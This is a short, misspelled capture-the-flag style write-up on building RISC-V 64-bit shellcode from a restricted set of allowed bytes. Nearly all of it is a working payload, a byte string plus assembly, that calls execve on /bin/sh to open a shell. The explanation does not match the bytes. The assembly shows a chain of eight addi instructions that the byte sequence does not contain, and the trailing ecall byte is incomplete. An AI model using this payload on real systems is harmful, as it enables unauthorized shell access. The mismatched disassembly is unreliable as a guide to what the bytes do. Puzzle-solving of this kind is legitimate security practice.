# A risc-V maneuver

## shellcodeing problom for the RISC-V 64le architecture

the user is limmited to useing the following bytes to construct shellcode

`{ 0x01, 0x08, 0x0d, 0x45, 0x46, 0x47, 0x48, 0x49, 0x65, 0x73, 0x81, 0x93, 0xd0 }`

## bellow is my solution first as bytes then as riscv64le asm

` { 0x49, 0x65, 0x81, 0x45, 0x01, 0x46, 0x81, 0x46, 0x01, 0x47, 0x81, 0x47, 0x01, 0x48, 0x93, 0x08, 0xd0, 0x0d, 0x73 } `

sets a0 to 0x12000, location of /bin/sh

```
lui a0, 18
```

zero out other args

```
li a1, 0
li a2, 0
li a3, 0
li a4, 0
li a5, 0
li a6, 0
```

set a7 to 221, execve

```
li a7, 29
addi a7, a7, 24
addi a7, a7, 24
addi a7, a7, 24
addi a7, a7, 24
addi a7, a7, 24
addi a7, a7, 24
addi a7, a7, 24
addi a7, a7, 24
```

syscall

```
ecall;
```
